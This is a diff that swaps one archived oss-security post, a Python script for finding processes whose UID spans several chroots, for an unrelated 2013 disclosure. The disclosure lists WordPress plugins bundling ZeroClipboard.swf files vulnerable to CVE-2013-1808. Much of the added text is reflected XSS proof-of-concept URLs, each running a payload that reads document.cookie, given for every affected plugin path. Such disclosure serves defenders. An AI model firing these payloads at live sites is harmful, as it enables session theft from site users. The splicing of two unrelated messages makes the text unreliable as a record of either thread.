@@ -1,41 +1,146 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/06/06/9
-Message-ID: <CAHmME9qaqRSL05diFJM=-9UPCaMBhj9LrVWN4SbRGP71J1e-pQ@mail.gmail.com>
-Date: Thu, 6 Jun 2013 15:31:25 +0200
-From: "Jason A. Donenfeld" <Jason@...c4.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: Re: chroots & uid sharing
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/10/2
+Message-ID: <20130310085207.GA5220@kludge.henri.nerv.fi>
+Date: Sun, 10 Mar 2013 10:52:07 +0200
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Cc: plugins@...dpress.org
+Subject: WordPress plugins vulnerable to CVE-2013-1808
 Content-Type: text/plain; charset=utf-8
 
-Alright that one-liner killed kittens. Sorry. Here we go:
+Hello list members,
 
-frisell zx2c4 # cat find-bad-chroots.py
-#!/usr/bin/env python2
+I tested WordPress plugins to see which are vulnerable to CVE-2013-1808, because
+original founder of this vulnerability did not, which is irresponsible
+disclosure in my opinion.
 
-import os
+Plugin doesn't need to be actived to be vulnerable. Only tested trunk. Some of
+these have already been reported to WordPress plugins-address via email.
 
-chroots = { }
+Not vulnerable 2013-03-10:
+    yandex-add-url
+    web2print-beta
+    q2w3-inc-manager
 
-for pid in os.listdir("/proc/"):
-        if not pid.isdigit():
-                continue
-        try:
-                uid = os.stat("/proc/" + pid).st_uid
-                root = os.readlink("/proc/" + pid + "/root")
-        except:
-                continue
-        if uid not in chroots:
-                chroots[uid] = [root]
-        elif root not in chroots[uid]:
-                chroots[uid].append(root)
+Not found in plugin-install.php search 2013-03-10. Reason for this might be that
+someone already reported these:
+    wpmob-lite
+    search-and-share
+    scorerender
+    savingscom-coupon-plugin-and-widget
+    lb-mixed-slideshow
+    java-trackback
+    ed2k-link-selector
+    drp-coupon
+    coupon-code-plugin
+    bookings-plus
 
-for uid in chroots:
-        if len(chroots[uid]) > 1:
-                print "UID: %d" % uid
-                for root in chroots[uid]:
-                        print "\t%s" % root
+Please contact me in case you need more information. List of affected plugins:
 
-frisell zx2c4 # ./find-bad-chroots.py
-UID: 25
-        /var/empty
-        /
+Plugin: wp-link-to-us
+Version: 2.0 1
+Reported to WordPress plugins-address: 2013-02-03
+
+Affected file: http://plugins.svn.wordpress.org/wp-link-to-us/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/wp-link-to-us/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+
+Affected file: http://plugins.svn.wordpress.org/wp-link-to-us/trunk/js/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
+PoC: wp-content/plugins/wp-link-to-us/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+-----
+Plugin: zopim-live-chat
+Version: 1.2.5
+Reported to WordPress plugins-address: 2013-02-03
+
+Affected file: http://plugins.svn.wordpress.org/zopim-live-chat/trunk/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/zopim-live-chat/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+-----
+Plugin: wppygments
+Version: 0.3.2
+Reported to WordPress plugins-address: 2013-02-03
+
+Affected file: http://plugins.svn.wordpress.org/wppygments/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/wppygments/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+
+Affected file: http://plugins.svn.wordpress.org/wppygments/trunk/js/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
+PoC: wp-content/plugins/wppygments/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+-----
+Plugin: wp-clone-by-wp-academy
+Version: 2.1.1
+Reported to WordPress plugins-address: 2013-02-03
+
+Affected file: http://plugins.svn.wordpress.org/wp-clone-by-wp-academy/trunk/lib/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/wp-clone-by-wp-academy/lib/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+-----
+Plugin: tiny-url
+Version: 1.3.2
+
+Affected file: http://plugins.svn.wordpress.org/tiny-url/trunk/swf/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
+PoC: wp-content/plugins/tiny-url/swf/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: thethe-layout-grid
+Version: 1.0.0
+
+Affected file: http://plugins.svn.wordpress.org/thethe-layout-grid/trunk/style/admin/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/thethe-layout-grid/style/admin/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: slidedeck2
+Version: 2.1.20130306
+
+Affected file: http://plugins.svn.wordpress.org/slidedeck2/trunk/js/zeroclipboard/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+
+Affected file: http://plugins.svn.wordpress.org/slidedeck2/trunk/js/zeroclipboard/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
+PoC: wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: paypal-digital-goods-monetization-powered-by-cleeng
+Version: 2.2.13
+
+Affected file: http://plugins.svn.wordpress.org/paypal-digital-goods-monetization-powered-by-cleeng/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/paypal-digital-goods-monetization-powered-by-cleeng/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: mobileview
+Version: 1.0.7
+
+Affected file: http://plugins.svn.wordpress.org/mobileview/trunk/admin/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/mobileview/admin/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: jaspreetchahals-coupons-lite
+Version: 2.1
+
+Affected file: http://plugins.svn.wordpress.org/jaspreetchahals-coupons-lite/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/jaspreetchahals-coupons-lite/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: geshi-source-colorer
+Version: 0.13
+
+Affected file: http://plugins.svn.wordpress.org/geshi-source-colorer/trunk/external/zeroclipboard/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/geshi-source-colorer/external/zeroclipboard/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: click-to-copy-grab-box
+Version: 0.1.1
+
+Affected file: http://plugins.svn.wordpress.org/click-to-copy-grab-box/trunk/lib/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/click-to-copy-grab-box/lib/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+
+Affected file: http://plugins.svn.wordpress.org/click-to-copy-grab-box/trunk/lib/ZeroClipboard10.swf 1ea0fc0cea30a7d912c2564d51204a816f1e58be
+PoC: wp-content/plugins/click-to-copy-grab-box/lib/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: cleeng
+Version: 2.3.2
+
+Affected file: http://plugins.svn.wordpress.org/cleeng/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/cleeng/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: buckets
+Version: 0.1.9.3
+
+Affected file: http://plugins.svn.wordpress.org/buckets/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/buckets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+-----
+Plugin: bp-code-snippets
+Version: 2.0
+
+Affected file: http://plugins.svn.wordpress.org/bp-code-snippets/trunk/js/ZeroClipboard.swf 406ca1ec9595fd96424e6c8f3802bc898f080116
+PoC: wp-content/plugins/bp-code-snippets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
